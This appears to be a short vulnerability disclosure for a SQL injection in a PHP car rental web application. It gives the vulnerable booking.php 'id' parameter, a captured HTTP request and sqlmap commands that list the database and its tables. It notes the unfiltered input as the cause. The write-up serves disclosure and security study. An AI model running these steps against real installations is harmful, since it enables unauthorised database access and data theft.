# Car Rental System SQL Injection
* `Note` => Login to customer
* `Injection Point` => `http://192.168.1.101:8080/Car_Rental/booking.php?id=1`
# Exploit 
* Exploit with `Sqlmap` + `Burp Suite `
![image](https://user-images.githubusercontent.com/79050415/159719099-d87a540c-b90f-49ca-8377-36bd97a4314e.png)
* Use `Burp Suite` capture request 
* Then save as `sqlicar.txt`
```c
GET /Car_Rental/booking.php?id=1 HTTP/1.1
Host: 192.168.1.101:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.101:8080/Car_Rental/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: ci_session=jo7rsp3d4su5223o11544otrc44odm2l; PHPSESSID=5cddkjjvh5nhvqh96t306gau8b
Connection: close

```
* Exploit with `Sqlmap`
```c
 python3 sqlmap.py -r sqlicar.txt --current-db
```
![image](https://user-images.githubusercontent.com/79050415/159721152-f8a48ce3-3cde-4743-bb4a-babb858e9e48.png)

```python
python3 sqlmap.py -r sqlicar.txt -D carrentalp --tables
```
![image](https://user-images.githubusercontent.com/79050415/159719187-a0e7785b-ddf4-4581-a7ca-75e3343f4b49.png)
# Information Disclosure
![image](https://user-images.githubusercontent.com/79050415/159721411-55b6bdde-6ad6-4490-ac0e-a96e1a7bd1f7.png)
![image](https://user-images.githubusercontent.com/79050415/159721455-10c52b03-bc77-4aaf-8de1-684a30af17b7.png)

# Vulnerable Code
![image](https://user-images.githubusercontent.com/79050415/159724951-39b8fd8b-9a6d-4797-846e-ca69b7767a8e.png)
* No filter `id` when inserting data to database
